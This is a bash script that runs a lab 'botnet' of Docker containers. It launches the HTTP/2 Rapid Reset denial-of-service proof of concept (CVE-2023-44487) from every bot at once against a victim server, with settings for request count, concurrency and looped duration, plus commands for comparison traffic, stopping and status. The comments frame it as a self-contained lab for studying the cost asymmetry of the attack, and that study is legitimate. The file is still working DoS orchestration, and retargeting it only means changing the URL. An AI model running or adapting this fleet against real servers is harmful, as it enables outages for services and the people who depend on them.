#!/usr/bin/env bash
# =============================================================================
# Management of THIS lab's bot fleet (one command = deploy / launch / stop
# attack on all bots at once). Bots ALREADY HAVE the PoC `rapidreset`
# built-in at image build time (bot/Dockerfile) - this script does not
# deploy anything at runtime, it only controls ready containers.
#
# BOUNDARY: manages only the fleet of OWN, pre-built containers of this lab.
# No mechanism for distribution/implantation of the attack to devices that
# don't already have it (this is intentionally out of scope).
#
# Commands:
#   up [N]              deploy a fleet of N bots + base lab (default N=5)
#   fire [options]       launch traffic on ALL fleet bots simultaneously
#       --mode attack|legit  attack = rapidreset (HEADERS+RST_STREAM, PoC CVE-2023-44487)
#                            legit  = h2load (complete HTTP/2 requests - traffic imitating
#                                     a normal client, for cost asymmetry comparison)
#                            (default attack)
#       --requests N      requests/streams per bot (default 20000)
#       --concurrency N   concurrent workers/connections per bot (default 200)
#       --duration S       >0: loop for S seconds (default 0 = one-shot)
#   stop                 stop traffic on all bots (pkill rapidreset + h2load)
#   status               table: which bot in which mode + victim CPU/connections
#   down                  take down the fleet (keeps the base lab)
#
# Examples:
#   bash scenarios/botnet-fleet.sh up 5
#   bash scenarios/botnet-fleet.sh fire --mode attack --requests 20000 --concurrency 300
#   bash scenarios/botnet-fleet.sh fire --mode legit  --requests 2000  --concurrency 20 --duration 30
#   bash scenarios/botnet-fleet.sh status
#   bash scenarios/botnet-fleet.sh stop
#   bash scenarios/botnet-fleet.sh down
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true
export MSYS2_ARG_CONV_EXCL='*' 2>/dev/null || true

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

FILES=(-f docker-compose.yml -f docker-compose.override.yml -f docker-compose.botnet.yml)
dc()  { docker compose "${FILES[@]}" "$@"; }

fleet_ids() { dc ps -q botfleet 2>/dev/null; }

cmd_up() {
  local n="${1:-5}"
  echo "[*] Deploying base + fleet botfleet=$n ..."
  dc up -d --build --scale "botfleet=$n"
  echo "[*] Waiting for victim (HTTP/2) ..."
  for _ in $(seq 1 30); do
    dc exec -T loadgen curl -sk --max-time 2 https://victim/ -o /dev/null && { echo "[*] victim OK"; break; }
    sleep 1
  done
  local ids; ids="$(fleet_ids)"
  local count; count="$(echo "$ids" | grep -c . || true)"
  echo "[*] Fleet ready: $count bots"
}

cmd_fire() {
  local req=20000 conc=200 dur=0 mode=attack
  while [ $# -gt 0 ]; do
    case "$1" in
      --mode)        mode="$2"; shift ;;
      --requests)    req="$2"; shift ;;
      --concurrency) conc="$2"; shift ;;
      --duration)    dur="$2"; shift ;;
      *) echo "Unknown fire option: $1" >&2; exit 2 ;;
    esac
    shift
  done
  case "$mode" in attack|legit) ;; *) echo "Unknown --mode: $mode (attack|legit)" >&2; exit 2 ;; esac

  local ids; ids="$(fleet_ids)"
  if [ -z "$ids" ]; then
    echo "[!] Fleet does not exist. Run first:  bash scenarios/botnet-fleet.sh up [N]" >&2
    exit 1
  fi
  local count; count="$(echo "$ids" | wc -l | tr -d ' ')"
  echo "[*] Launching '$mode' traffic on $count bots simultaneously (requests=$req concurrency=$conc duration=${dur}s) ..."

  local single
  if [ "$mode" = "attack" ]; then
    single="rapidreset -url https://victim:443 -requests $req -concurrency $conc -quiet >/dev/null 2>&1"
  else
    single="h2load -n $req -c $conc https://victim/ >/dev/null 2>&1"
  fi

  for cid in $ids; do
    if [ "$dur" -gt 0 ]; then
      docker exec -d "$cid" sh -c \
        "end=\$(( \$(date +%s) + $dur )); while [ \$(date +%s) -lt \$end ]; do $single; done" &
    else
      docker exec -d "$cid" sh -c "$single" &
    fi
  done
  wait
  echo "[*] Traffic '$mode' started on all fleet bots (container background)."
  [ "$dur" -eq 0 ] && echo "[*] One-shot mode — check 'status' in a moment, it will finish on its own."
  [ "$dur" -gt 0 ] && echo "[*] Continuous mode for ${dur}s — use 'stop' to interrupt earlier."
}

cmd_stop() {
  local ids; ids="$(fleet_ids)"
  [ -z "$ids" ] && { echo "[!] Fleet does not exist."; exit 1; }
  echo "[*] Stopping traffic (attack + legit) on all bots ..."
  for cid in $ids; do
    docker exec "$cid" sh -c 'pkill rapidreset 2>/dev/null; pkill h2load 2>/dev/null; exit 0'
  done
  echo "[*] Stopped."
}

cmd_status() {
  local ids; ids="$(fleet_ids)"
  if [ -z "$ids" ]; then
    echo "[!] Fleet does not exist (run 'up' first)."
    exit 1
  fi
  echo "--- Bot fleet ---"
  printf "%-16s %-8s\n" "CONTAINER" "MODE"
  local active=0 total=0
  for cid in $ids; do
    total=$((total+1))
    local name; name="$(docker inspect -f '{{.Name}}' "$cid" | sed 's#^/##')"
    if docker exec "$cid" pgrep rapidreset >/dev/null 2>&1; then
      printf "%-16s %-8s\n" "$name" "attack"
      active=$((active+1))
    elif docker exec "$cid" pgrep h2load >/dev/null 2>&1; then
      printf "%-16s %-8s\n" "$name" "legit"
      active=$((active+1))
    else
      printf "%-16s %-8s\n" "$name" "-"
    fi
  done
  echo "-------------------"
  echo "Active: $active / $total"
  echo
  echo "--- Victim (stub_status) ---"
  dc exec -T loadgen curl -sk --max-time 3 https://victim/status 2>/dev/null || echo "(no response)"
}

cmd_down() {
  echo "[*] Taking down fleet botfleet (keeping base lab) ..."
  dc up -d --scale botfleet=0 2>/dev/null
  echo "[*] Done."
}

case "${1:-}" in
  up)     shift; cmd_up "$@" ;;
  fire)   shift; cmd_fire "$@" ;;
  stop)   cmd_stop ;;
  status) cmd_status ;;
  down)   cmd_down ;;
  *)
    sed -n '2,33p' "$0" | sed 's/^# //; s/^#//'
    exit 2
    ;;
esac
